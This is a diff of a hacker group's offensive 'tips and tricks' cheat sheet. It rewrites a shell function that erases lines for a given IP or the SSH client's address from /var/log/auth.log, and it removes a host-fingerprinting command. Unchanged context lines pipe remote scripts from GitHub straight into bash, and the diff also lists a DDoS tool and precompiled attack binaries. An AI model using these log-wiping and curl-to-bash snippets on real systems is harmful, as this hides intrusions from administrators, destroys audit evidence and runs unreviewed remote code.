@@ -79,8 +79,6 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Restore the date of a file](#restore-timestamp)
    1. [Clean logfile](#shell-clean-logs)
    1. [Hide files from a User without root privileges](#shell-hide-files)
-   1. [Find out Linux Distro](#linux-info)
-   2. [Find +s binaries / Find writeable directories](#suid)
 1. [Crypto](#crypto)
    1. [Generate quick random Password](#gen-password)
    1. [Linux transportable encrypted filesystems](#crypto-filesystem)
@@ -1551,11 +1549,6 @@ Get essential information about a host:
 curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/whatserver.sh | bash
 ```
 
-Find out the Linux Distribution
-```sh
-uname -a; lsb_release -a 2>/dev/null; cat /etc/*release /etc/issue* /proc/version /etc/hosts 2>/dev/null
-```
-
 netstat if there is no netstat/ss/lsof:
 ```sh
 curl -fsSL https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/tools/awk_netstat.sh | bash
@@ -1641,11 +1634,12 @@ This will reset the logfile to 0 without having to restart syslogd etc:
 
 This will remove any line containing the IP `1.2.3.4` from the log file:
 ```sh
-#DEL=thc.org
-#DEL=${SSH_CLIENT%% *}
-DEL=1.2.3.4
-LOG=/var/log/auth.log
-IFS="" a=$(sed "/${DEL}/d" <"${LOG}") && echo "$a">"${LOG}"
+xlog() {
+    local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"
+}
+xlog "1\.2\.3\.4" /var/log/auth.log
+# xlog "${SSH_CLIENT%% *}" /var/log/auth.log
+# xlog "^2023.* thc\.org" foo.log
 ```
 
 <a id="shell-hide-files"></a>
@@ -2008,7 +2002,8 @@ Vulnerability Scanners
 DDoS
 1. [DeepNet](https://github.com/the-deepnet/ddos) - we despise DDoS but if we had to then this would be our choice.
 
-Static Binaries / Warez
+Static Binaries / pre-compiled Tools
+1. https://github.com/Azathothas/Toolpacks/tree/main from [hysp project](https://github.com/metis-os/hysp-pkgs)
 1. https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
 1. https://iq.thc.org/cross-compiling-exploits
 
